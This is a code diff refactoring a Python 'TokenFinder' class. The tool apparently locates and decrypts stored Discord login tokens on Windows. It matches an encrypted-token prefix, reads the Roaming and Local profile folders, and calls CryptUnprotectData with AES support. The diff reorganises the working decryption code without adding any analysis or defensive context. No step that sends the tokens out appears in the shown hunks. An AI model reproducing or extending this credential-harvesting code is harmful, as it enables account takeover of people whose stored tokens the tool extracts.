@@ -10,16 +10,49 @@ import json
 import base64
 import sys
 from pathlib import Path
-from typing import List, Optional, Tuple
+from typing import List, Optional, Tuple, Any
 
-# Set UTF-8 encoding for Windows
-if sys.platform == "win32":
-    import codecs
-    try:
-        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
-        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
-    except:
-        pass
+# Windows-specific imports (only when actually used)
+WINDOWS_AVAILABLE = False
+CRYPTO_AVAILABLE = False
+DATA_BLOB = None
+_ctypes = None
+
+# Deferred initialization
+def _init_windows():
+    """Initialize Windows-specific imports. Called when TokenFinder is instantiated."""
+    global WINDOWS_AVAILABLE, CRYPTO_AVAILABLE, DATA_BLOB, _ctypes
+    
+    # Set UTF-8 encoding for Windows
+    if sys.platform == "win32":
+        import codecs
+        try:
+            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
+            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
+        except:
+            pass
+    
+    if sys.platform == "win32":
+        try:
+            import ctypes
+            from ctypes import POINTER, Structure, c_buffer, c_char, wintypes
+            
+            class DATA_BLOB(Structure):
+                _fields_ = [
+                    ("cbData", wintypes.DWORD),
+                    ("pbData", POINTER(c_char))
+                ]
+            
+            _ctypes = ctypes
+            WINDOWS_AVAILABLE = True
+        except ImportError:
+            pass
+        
+        try:
+            from Crypto.Cipher import AES
+            CRYPTO_AVAILABLE = True
+        except ImportError:
+            pass
 
 # Debug mode
 DEBUG = False
@@ -35,32 +68,6 @@ def pause():
     try:
         input()
     except:
-        pass
-
-# Windows-specific imports (only fail when actually used)
-WINDOWS_AVAILABLE = False
-CRYPTO_AVAILABLE = False
-DATA_BLOB = None
-
-if sys.platform == "win32":
-    try:
-        import ctypes
-        from ctypes import POINTER, Structure, c_buffer, c_char, wintypes
-        
-        class DATA_BLOB(Structure):
-            _fields_ = [
-                ("cbData", wintypes.DWORD),
-                ("pbData", POINTER(c_char))
-            ]
-        
-        WINDOWS_AVAILABLE = True
-    except ImportError:
-        pass
-    
-    try:
-        from Crypto.Cipher import AES
-        CRYPTO_AVAILABLE = True
-    except ImportError:
         pass
 
 
@@ -82,6 +89,9 @@ class TokenFinder:
     ENCRYPTED_TOKEN_PATTERN = r'dQw4w9WgXcQ:[^.*\[\'(.*)\'\].*$][^"]*'
     
     def __init__(self):
+        # Initialize Windows-specific stuff first
+        _init_windows()
+        
         # Check platform only when actually using TokenFinder, not at import
         if sys.platform != "win32":
             raise RuntimeError("Token finder only works on Windows")
@@ -94,27 +104,27 @@ class TokenFinder:
         debug_print(f"Roaming: {self.roaming}")
         debug_print(f"Local: {self.local}")
         
-    def _get_data(self, blob_out: Structure) -> bytes:
+    def _get_data(self, blob_out: Any) -> bytes:
         """Extract data from Windows data blob"""
         cb_data = int(blob_out.cbData)
         pb_data = blob_out.pbData
-        buffer = c_buffer(cb_data)
-        ctypes.cdll.msvcrt.memcpy(buffer, pb_data, cb_data)
-        ctypes.windll.kernel32.LocalFree(pb_data)
+        buffer = _ctypes.c_buffer(cb_data)
+        _ctypes.cdll.msvcrt.memcpy(buffer, pb_data, cb_data)
+        _ctypes.windll.kernel32.LocalFree(pb_data)
         return buffer.raw
     
     def _crypt_unprotect(self, encrypted_bytes: bytes, entropy: bytes = b"") -> Optional[bytes]:
         """Decrypt using Windows CryptUnprotectData"""
         try:
-            buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-            buffer_entropy = c_buffer(entropy, len(entropy))
+            buffer_in = _ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
+            buffer_entropy = _ctypes.c_buffer(entropy, len(entropy))
             blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
             blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
             blob_out = DATA_BLOB()
             
-            if ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(blob_in), None, ctypes.byref(blob_entropy),
-                None, None, 0x01, ctypes.byref(blob_out)
+            if _ctypes.windll.crypt32.CryptUnprotectData(
+                _ctypes.byref(blob_in), None, _ctypes.byref(blob_entropy),
+                None, None, 0x01, _ctypes.byref(blob_out)
             ):
                 return self._get_data(blob_out)
         except Exception as e:
